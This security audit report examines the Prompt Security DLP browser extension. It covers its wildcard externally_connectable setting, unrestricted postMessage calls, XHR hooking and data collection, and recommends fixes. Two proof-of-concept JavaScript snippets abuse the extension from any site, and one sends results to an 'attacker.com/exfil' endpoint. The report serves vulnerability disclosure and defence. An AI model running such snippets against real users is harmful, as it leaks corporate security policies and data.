# Security Analysis: Prompt Security Browser Extension (iidnankcocecmgpcafggbgbmkbcldmno)

## Extension Metadata
- **Name**: Prompt Security Browser Extension
- **Extension ID**: iidnankcocecmgpcafggbgbmkbcldmno
- **Version**: 7.0.15
- **Manifest Version**: 3
- **Estimated Users**: ~90,000
- **Developer**: Prompt Security
- **Analysis Date**: 2026-02-14

## Executive Summary

Prompt Security Browser Extension is a **legitimate enterprise Data Loss Prevention (DLP) tool** designed to prevent sensitive information disclosure to GenAI platforms. However, it has **CRITICAL security vulnerabilities** that create significant attack surface for malicious websites.

**Overall Risk Assessment: HIGH**

While the extension serves its intended purpose (monitoring AI chat interactions for corporate data leakage), it contains severe security design flaws that could allow ANY website on the internet to:
1. Invoke protected extension APIs without origin validation
2. Potentially access corporate API keys and configuration
3. Exfiltrate user prompts and responses from AI platforms
4. Abuse the DLP scanning API with attacker-controlled data

The extension's broad permissions (`<all_urls>`, identity, downloads) combined with wildcard `externally_connectable` create an unacceptable security risk that outweighs its DLP benefits.

---

## CRITICAL Vulnerability: Wildcard externally_connectable

### Severity: CRITICAL
**CVE-Equivalent Risk**: High

**Location**: `manifest.json` lines 28-33

**Vulnerability**:
```json
"externally_connectable": {
  "matches": [
    "http://*/*",
    "https://*/*"
  ]
}
```

This configuration allows **ANY website on the entire internet** (including attacker-controlled domains) to communicate with the extension via `chrome.runtime.sendMessage()`.

**Exposed APIs** (`background.bundle.js` line 3306-3308):
```javascript
browserObj.runtime.onMessageExternal.addListener(function(e, t, o) {
  "callProtectApi" === e.message ? o(yield N(e, t.tab)) :
  "callProtectApiForResponse" === e.message ? o(yield M(e, t.tab)) :
  "callProtectFileApi" === e.message ? o(yield L(e, t.tab)) :
  "callShouldInspectChat" === e.message ? o(yield F(e.url, e.body, ...)) :
  "addLog" === e.message ? yield addLog(e.location, e.log, e.ctx) :
  "callMcpApi" === e.message && o(yield $(e, t.tab))
})
```

**Attack Scenarios**:

1. **Corporate Data Exfiltration**:
   - Malicious website sends crafted `callProtectApi` message with attacker-controlled text
   - Extension forwards this to Prompt Security backend with corporate API key
   - Attacker receives DLP scan results containing corporate policy details
   - Could leak information about what types of data are considered sensitive

2. **API Key/Config Exposure**:
   - Attacker sends messages to trigger backend API calls
   - Monitors response metadata or timing attacks
   - Could infer corporate API domain, authentication tokens, or configuration

3. **Prompt Interception**:
   - Attacker crafts messages mimicking AI platform requests
   - Extension processes them as legitimate AI prompts
   - Could test DLP rules, trigger false alerts, or DoS corporate DLP service

4. **Log Injection**:
   - `addLog` message allows ANY website to write logs
   - Could inject false security events, obscure real attacks, or flood logging infrastructure

**Proof of Concept**:
```javascript
// From ANY website (e.g., attacker.com):
chrome.runtime.sendMessage(
  'iidnankcocecmgpcafggbgbmkbcldmno',  // Extension ID
  {
    message: 'callProtectApi',
    text: 'Test sensitive data: SSN 123-45-6789',
    domain: 'attacker.com',
    userEnteredTexts: { 'test': { type: 'full_prompt' } },
    requestUrl: 'https://attacker.com/fake-ai-endpoint'
  },
  (response) => {
    console.log('DLP scan result:', response);
    // Attacker now knows if SSN patterns are flagged
  }
);
```

**Impact**:
- Corporate security policy leakage
- Unauthorized access to enterprise DLP service
- Potential credential/token exposure
- Compliance violations (sending corporate data to attacker domains)

**Fix Required**:
Change `externally_connectable` to ONLY the specific AI domains that need to integrate:
```json
"externally_connectable": {
  "matches": [
    "https://chatgpt.com/*",
    "https://claude.ai/*",
    "https://copilot.microsoft.com/*",
    "https://gemini.google.com/*"
  ]
}
```

---

## HIGH Vulnerability: postMessage without Origin Validation

### Severity: HIGH

**Locations**:
- `content.bundle.js` line 450-459
- `script.bundle.js` line 461-468

**Code Evidence** (`content.bundle.js`):
```javascript
window.addEventListener("message", function(e) {
  return n(this, void 0, void 0, function*() {
    if (e.source !== window || !e.data || "FROM_PAGE" !== e.data.type) return;
    let t = yield a.browserObj.runtime.sendMessage(e.data.message);
    window.postMessage({
      type: "FROM_BACKGROUND",
      messageId: e.data.messageId,
      response: t
    }, "*")  // NO ORIGIN RESTRICTION
  })
});
```

**Code Evidence** (`script.bundle.js`):
```javascript
function q(e) {
  return new Promise(t => {
    const o = Math.random().toString(36).substring(2) + Date.now().toString(36);
    window.addEventListener("message", function e(n) {
      n.source === window && n.data && "FROM_BACKGROUND" === n.data.type
        && n.data.messageId === o && (window.removeEventListener("message", e), t(n.data.response))
    }),
    window.postMessage({
      type: "FROM_PAGE",
      messageId: o,
      message: e
    }, "*")  // NO ORIGIN RESTRICTION
  })
}
```

**Vulnerability**:
The extension creates a message relay between page context and extension context via `window.postMessage()` with wildcard target origin (`"*"`). While it checks `e.source === window`, this only prevents cross-frame attacks, NOT same-frame malicious scripts.

**Attack Scenarios**:

1. **Message Interception**:
   - Malicious script injected via XSS on AI platform (or browser extension conflict)
   - Listens for `FROM_BACKGROUND` messages
   - Intercepts DLP scan results, API responses, or configuration data

2. **Message Injection**:
   - Attacker sends crafted `FROM_PAGE` messages
   - Extension forwards them to background script
   - Could trigger unintended API calls or bypass DLP controls

3. **Timing/Replay Attacks**:
   - MessageIds are predictable (`Math.random()` + `Date.now()`)
   - Attacker could race to intercept responses or replay messages

**Impact**:
- User prompts and DLP scan results exposed to malicious scripts
- Potential bypass of DLP controls via crafted messages
- Information leakage about corporate security policies

**Fix Required**:
1. Use unique, cryptographically random message IDs
2. Post messages with restricted origin: `window.postMessage(data, window.origin)`
3. Validate message origin: `if (e.origin !== window.origin) return;`
4. Use `crypto.randomUUID()` instead of `Math.random()`

---

## HIGH Vulnerability: Fetch/XHR Hooking on All Pages

### Severity: HIGH

**Location**: `script.bundle.js` lines 975-988

**Code Evidence**:
```javascript
let e = window.XMLHttpRequest.prototype.open;
window.XMLHttpRequest.prototype.open = function(t, o, n = !0) {
  // Hook intercepts ALL XHR requests
};

let t = window.XMLHttpRequest.prototype.send;
window.XMLHttpRequest.prototype.send = function() {
  // Hook intercepts ALL XHR sends
};
```

**Vulnerability**:
The extension **monkey-patches** native browser APIs (`XMLHttpRequest.prototype.open/send`, likely `fetch` as well based on code patterns) to intercept network requests. This runs on **ALL websites** due to content script injection on `"matches": ["http://*/*", "https://*/*"]`.

**Attack Surface**:

1. **Performance Impact**:
   - Every XHR/fetch on every website goes through extension hooks
   - Could create significant latency or memory leaks
   - DoS vector if hooks malfunction

2. **Privacy Concerns**:
   - Extension monitors ALL network traffic, not just AI platforms
   - Could capture sensitive requests (banking, healthcare, etc.)
   - Sends traffic metadata to Prompt Security backend

3. **Compatibility Issues**:
   - Prototype modification can break other extensions
   - Anti-tampering detection on some sites may trigger
   - Sites using `Object.freeze()` on prototypes may fail

4. **Accidental Data Collection**:
   - Non-AI requests may contain PII/credentials
   - Extension logs show `detectUrl()` function scans ALL URLs
   - Could violate GDPR/privacy regulations

**Impact**:
- Mass surveillance of user browsing activity
- Performance degradation across entire browser
- Potential exposure of sensitive non-AI data to DLP backend

**Recommendation**:
Limit content script injection to ONLY AI platform domains:
```json
"content_scripts": [{
  "matches": [
    "https://chatgpt.com/*",
    "https://claude.ai/*",
    "https://copilot.microsoft.com/*",
    // ... only AI platforms
  ]
}]
```

---

## MEDIUM Vulnerability: Sensitive Data Exfiltration by Design

### Severity: MEDIUM (Intended Behavior, but High Risk)

**Location**: `background.bundle.js` lines 2531-2727

**Functionality**:
The extension intercepts ALL user input to AI platforms and sends it to external Prompt Security servers:

```javascript
function N(e, o) {
  // ... extract user prompts
  const v = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "APP-ID": w  // Corporate API key
    },
    body: JSON.stringify({
      prompts: O,  // User-entered text
      user: x.userInfo.email,  // User email
      extension_data: x,  // Full context
      conversation_id: h.conversationId,
      // ... more metadata
    }),
    signal: AbortSignal.timeout(5e3)
  };

  let $ = yield fetch(`${T}/api/protect`, v);  // Send to external server
  // ... modify or block prompts based on response
}
```

**Data Transmitted**:
- **User prompts**: Full text of every message to ChatGPT, Claude, Copilot, etc.
- **User identity**: Email address from identity API
- **Conversation context**: IDs, history, page URLs
- **File uploads**: `callProtectFileApi` scans uploaded files
- **Machine/browser metadata**: From managed schema (MDM deployments)

**Endpoints**:
Based on code analysis, data flows to:
- Configurable `apiDomain` from managed schema (likely `*.prompt.security`)
- All 20+ AI platform endpoints for monitoring

**Risk Factors**:

1. **Third-Party Data Access**:
   - Prompt Security company receives ALL user AI interactions
   - Includes potentially sensitive: code, documents, personal queries
   - Users may not consent or be aware

2. **Man-in-the-Middle Position**:
   - Extension can **modify** prompts before sending to AI
   - Can **block** prompts entirely
   - DLP "modify" mode rewrites user text with sanitized versions

3. **API Key Exposure**:
   - Corporate API keys stored in `chrome.storage.local`
   - Accessible via `getSettings()` function
   - Could be exfiltrated if extension is compromised

4. **Fail-Closed Mode**:
   - If `failClose` setting enabled, ALL prompts blocked if API unreachable
   - Could DoS entire company's AI usage

**Data Flow**:
```
User types in ChatGPT →
Content script hooks fetch() →
Extracts prompt text →
Sends to background.js →
POSTs to Prompt Security API →
API returns "Block", "Modify", or "Ignore" →
Extension modifies/blocks user's prompt →
Modified text sent to ChatGPT
```

**Compliance Concerns**:
- **GDPR Article 5**: Lawfulness, fairness, transparency (users may not know)
- **GDPR Article 32**: Security (sending sensitive data to third party)
- **CCPA**: Sale of personal information (if Prompt Security uses data for analytics)

**Mitigation**:
This is **intended functionality** for enterprise DLP, but requires:
- Clear user disclosure during installation
- Data Processing Agreement (DPA) with Prompt Security
- Audit of Prompt Security's data handling practices
- Option to disable for non-enterprise users

---

## LOW Vulnerability: Cookie Access on All Domains

### Severity: LOW

**Evidence**: Pre-filled `flagCategories` includes `cookie_harvesting`

**Issue**:
With `<all_urls>` host permission and content scripts on all sites, the extension CAN access cookies via `document.cookie`. Static analysis flagged this pattern.

**Actual Behavior**:
No evidence of cookie exfiltration in code review. The extension focuses on AI platform monitoring, not cookie harvesting. Flag is likely a false positive from broad permissions.

**Risk**:
Low - No malicious cookie access observed, but permission exists.

---

## Permission Analysis

| Permission | Justification | Risk Level | Notes |
|------------|---------------|------------|-------|
| `<all_urls>` | Monitor AI platforms + cloud storage | **CRITICAL** | Should be limited to specific AI domains |
| `tabs` | Tab management for DLP UI | Medium | Allows reading URLs of all tabs |
| `storage` | Store settings, API keys | **HIGH** | Contains corporate credentials |
| `identity` | Get user email for logging | Medium | Exposes corporate identity |
| `identity.email` | User email address | Medium | PII exposure |
| `alarms` | Periodic sync with backend | Low | Legitimate functionality |
| `declarativeNetRequest` | Network filtering | Medium | Could block legitimate requests |
| `downloads` | Download DLP reports | Low | Limited risk |

**Total Risk**: **CRITICAL** due to combination of `<all_urls>` + `externally_connectable` wildcards.

---

## Network Activity Analysis

### External Endpoints

**AI Platforms Monitored** (23 domains):
- ChatGPT (chatgpt.com, api.openai.com)
- Claude (claude.ai)
- Microsoft Copilot (copilot.microsoft.com, m365.cloud.microsoft)
- Google Gemini (gemini.google.com)
- Perplexity (www.perplexity.ai, suggest.perplexity.ai)
- GitHub Copilot (api.business.githubcopilot.com)
- Mistral AI (chat.mistral.ai, mistralaichatupprodswe.blob.core.windows.net)
- Grok (grok.com)
- DeepSeek (chat.deepseek.com)
- You.com, iAsk.ai, GenSpark

**Cloud Storage Monitored**:
- Google Drive, Dropbox, iCloud, OneDrive, WeTransfer, AWS S3, SharePoint

**Prompt Security Backend**:
- Configurable domain via `apiDomain` managed schema
- Likely: `api.prompt.security` or similar
- Endpoints:
  - `/api/protect` - DLP scanning
  - `/api/extension/explore` - Domain classification
  - `/api/extension/send-block-log` - Audit logging
  - `/api/mcp/` - MCP (Model Context Protocol) API

### Data Transmitted to Prompt Security

**Every AI Prompt**:
```json
{
  "prompts": ["User prompt text here"],
  "inputType": "full_prompt",
  "user": "user@company.com",
  "extension_data": {
    "pageUrl": "https://chatgpt.com/...",
    "pageDomain": "chatgpt.com",
    "userInfo": {
      "email": "user@company.com"
    }
  },
  "conversation_id": "uuid",
  "prompt_response_id": "uuid",
  "agentId": "g-...",
  "isEnterpriseVersion": true,
  "appUserEmail": "user@company.com"
}
```

**Response**:
```json
{
  "result": {
    "ruleInfo": {
      "action": "Block" | "Modify" | "Ignore"
    },
    "prompt": {
      "action": "block" | "modify",
      "violations": ["SSN", "Credit Card"],
      "findings": {
        "SSN": [{"entity": "123-45-6789", "sanitized_entity": "[REDACTED]"}]
      }
    }
  }
}
```

**Frequency**:
- Every keystroke on AI platforms (with debouncing)
- Every file upload
- Every conversation start/end
- Periodic heartbeat for config sync

---

## Code Quality Observations

### Positive Indicators
1. Uses TypeScript (compiled to JavaScript)
2. Async/await error handling with try/catch
3. Request timeouts (5 seconds via `AbortSignal.timeout`)
4. Retry logic for 401 unauthorized responses
5. Logging framework with context tracing
6. Manifest V3 compliance

### Security Anti-Patterns
1. **Prototype pollution**: Modifies `XMLHttpRequest.prototype` globally
2. **Weak randomness**: `Math.random()` for message IDs (not cryptographic)
3. **Wildcard postMessage**: Posts to `"*"` instead of specific origin
4. **No CSP for web_accessible_resources**: Script bundles accessible to all sites
5. **Broad content script injection**: Runs on ALL websites unnecessarily

### Obfuscation Level
**High** - Code is heavily minified with single-letter variable names. Original TypeScript source not included. Reverse engineering required significant effort.

---

## Comparison to Known Attack Patterns

| Attack Pattern | Present? | Evidence |
|----------------|----------|----------|
| **Externally_connectable wildcard** | ✓ YES | CRITICAL - `"matches": ["http://*/*", "https://*/*"]` |
| **PostMessage without origin check** | ✓ YES | HIGH - `window.postMessage(data, "*")` |
| **XHR/fetch hooking** | ✓ YES | HIGH - Prototype modification on all sites |
| **Data exfiltration** | ✓ YES | MEDIUM - Intended DLP behavior, but sends all prompts to 3rd party |
| **Cookie harvesting** | ✗ NO | False positive from static analysis |
| Extension enumeration | ✗ NO | No `chrome.management` API usage |
| Residential proxy | ✗ NO | No proxy configuration |
| Remote code loading | ✗ NO | No eval() or external script imports |
| Market intelligence SDKs | ✗ NO | No known tracking SDKs |

---

## Privacy Impact Assessment

**Data Collected**:
- ✓ Full text of all AI prompts and responses
- ✓ User email addresses (via `identity` API)
- ✓ Conversation IDs and history
- ✓ File uploads to AI platforms
- ✓ Page URLs and domains visited
- ✓ Machine name, browser name (if configured via MDM)
- ✓ Corporate email domain

**Data Shared with Third Parties**:
- **Prompt Security Inc.**: ALL collected data sent to external API
- **AI Platforms**: Modified prompts (with sensitive data redacted/blocked)

**User Control**:
- ❌ No opt-out mechanism for individual users
- ❌ No visibility into what data is flagged/blocked
- ✓ Enterprise admin can configure via managed schema
- ❌ No user-facing privacy settings

**Regulatory Compliance**:
- **GDPR**: ⚠️ Requires DPA with Prompt Security, user disclosure
- **CCPA**: ⚠️ Constitutes "sale" of personal information if data used for analytics
- **HIPAA**: ❌ NOT SAFE - Medical prompts to AI would be exposed to third party
- **SOC 2**: ✓ Likely compliant if Prompt Security is certified
- **FERPA**: ❌ NOT SAFE - Student data in prompts exposed

---

## Remediation Recommendations

### For Prompt Security (Developer)

**CRITICAL (Fix Immediately)**:
1. **Remove wildcard externally_connectable**:
   ```json
   "externally_connectable": {
     "matches": [
       "https://chatgpt.com/*",
       "https://claude.ai/*",
       "https://copilot.microsoft.com/*",
       "https://gemini.google.com/*"
     ]
   }
   ```

2. **Add origin validation to postMessage**:
   ```javascript
   window.addEventListener("message", function(e) {
     if (e.origin !== window.origin) return;  // CRITICAL FIX
     if (e.source !== window || !e.data) return;
     // ... rest of handler
   });

   window.postMessage(data, window.origin);  // Not "*"
   ```

3. **Limit content script injection**:
   ```json
   "content_scripts": [{
     "matches": [
       "https://chatgpt.com/*",
       "https://claude.ai/*",
       // ... only AI platforms, NOT "http://*/*"
     ]
   }]
   ```

**HIGH Priority**:
4. Use `crypto.randomUUID()` for message IDs instead of `Math.random()`
5. Implement CSP for web_accessible_resources
6. Add rate limiting to prevent API abuse
7. Encrypt API keys in storage (not plaintext)

**MEDIUM Priority**:
8. Add user-facing privacy dashboard
9. Implement audit logging of all data transmissions
10. Support data export requests (GDPR compliance)

### For Enterprise Administrators

**Before Deployment**:
1. ⚠️ **Audit Prompt Security's DPA** - Ensure data handling complies with regulations
2. ⚠️ **Disclose to users** - Inform employees ALL AI prompts are monitored
3. ⚠️ **Assess regulatory risk** - HIPAA/FERPA environments should NOT use this
4. Configure `corporateDomains` in managed schema to prevent non-corporate logins

**Ongoing Monitoring**:
5. Review Prompt Security audit logs monthly
6. Test DLP rules to prevent over-blocking
7. Monitor for extension conflicts (prototype pollution issues)
8. Plan rollback procedure if extension causes issues

### For Individual Users

**If Installed by Employer**:
- ⚠️ Assume ALL AI interactions are monitored and logged
- ❌ Do NOT use personal accounts (Gmail, personal Microsoft) with work browser
- ❌ Do NOT enter medical/financial PII into AI chats
- ✓ Use separate browser profile for personal AI usage

**If Self-Installed**:
- ❌ **REMOVE IMMEDIATELY** - This extension is designed for enterprise MDM deployments
- ⚠️ You are exposing all AI prompts to Prompt Security company
- ⚠️ No benefit without corporate DLP subscription

---

## Overall Risk Assessment

### Risk Level: **HIGH**

**Risk Score Breakdown**:
- Externally_connectable wildcard: **CRITICAL** (40 points)
- PostMessage without origin: **HIGH** (15 points)
- XHR/fetch hooking on all sites: **HIGH** (15 points)
- Broad permissions (`<all_urls>`): **MEDIUM** (10 points)
- Third-party data sharing: **MEDIUM** (10 points)
- **Total**: 90/100 (HIGH risk)

**Justification**:
1. **Attack Surface**: Wildcard `externally_connectable` allows ANY website to invoke extension APIs
2. **Data Exposure**: ALL AI prompts sent to third-party company (Prompt Security)
3. **Privilege Escalation**: Malicious websites can abuse DLP APIs with corporate credentials
4. **Privacy Impact**: Mass surveillance of user activity with no opt-out
5. **Compliance Risk**: Violates GDPR/HIPAA/FERPA in many scenarios

**Mitigating Factors**:
- ✓ Legitimate enterprise use case (DLP)
- ✓ Reputable vendor (Prompt Security is known security company)
- ✓ Designed for managed deployments (not consumer-facing)
- ✓ No evidence of malicious intent

**Critical Distinction**:
This is **NOT malware** - it's a poorly designed security tool with severe vulnerabilities that could be exploited by malicious actors. The risk stems from:
- Security design flaws (wildcard externally_connectable)
- Excessive privileges (monitoring all sites instead of just AI platforms)
- Lack of user transparency about data collection

---

## Proof of Vulnerability

### Exploit: External API Abuse

**Attacker Scenario**: Malicious website exfiltrates corporate DLP policies

**Steps**:
1. User with extension installed visits `https://evil.com`
2. Evil.com loads this JavaScript:

```javascript
// Exploit externally_connectable wildcard
chrome.runtime.sendMessage(
  'iidnankcocecmgpcafggbgbmkbcldmno',
  {
    message: 'callProtectApi',
    text: 'Test: SSN 123-45-6789, CC 4111-1111-1111-1111, API key sk-abc123',
    domain: 'evil.com',
    requestUrl: 'https://evil.com/fake-chatgpt',
    userEnteredTexts: {
      'payload': { type: 'full_prompt' }
    }
  },
  (response) => {
    // response.text reveals if prompt was blocked/modified
    // Tells attacker which patterns are flagged by corporate DLP
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);
```

3. Extension processes request as legitimate
4. Sends to Prompt Security API with corporate API key
5. Returns DLP scan result to evil.com
6. Attacker learns corporate security policies

**Impact**:
- Corporate DLP rules leaked
- Could craft payloads to evade detection
- Abuse of corporate DLP service quota

---

## Conclusion

Prompt Security Browser Extension is a **well-intentioned enterprise DLP tool with CRITICAL security flaws**. While it successfully prevents data leakage to AI platforms in enterprise environments, its wildcard `externally_connectable` configuration and postMessage handling create severe attack surface.

**Key Findings**:
1. ✓ **Legitimate purpose**: Enterprise DLP for AI platforms
2. ❌ **Critical vulnerability**: Wildcard externally_connectable
3. ❌ **High-risk design**: Monitoring all websites, not just AI platforms
4. ❌ **Privacy concern**: ALL prompts sent to third party
5. ⚠️ **Compliance risk**: May violate GDPR/HIPAA without proper disclosure

**Recommendations**:
- **Enterprises**: Deploy ONLY after Prompt Security fixes externally_connectable
- **Developers**: Implement security fixes outlined in remediation section
- **Users**: Understand ALL AI activity is monitored; use separate browser for personal use

**Final Verdict: HIGH RISK** - Legitimate tool with severe security vulnerabilities requiring immediate remediation.

---

## Technical Summary

**Lines of Code**: ~97,000 (deobfuscated bundles)
**External Dependencies**: None visible (self-contained TypeScript compilation)
**Manifest Version**: 3 (modern)
**Dynamic Code Execution**: None (`eval()`, `Function()` not used)
**Remote Code Loading**: None
**Obfuscation**: High (minified with Webpack/similar)

## Disclosure

This analysis was conducted for security research purposes. Findings should be responsibly disclosed to Prompt Security to allow remediation before public disclosure.
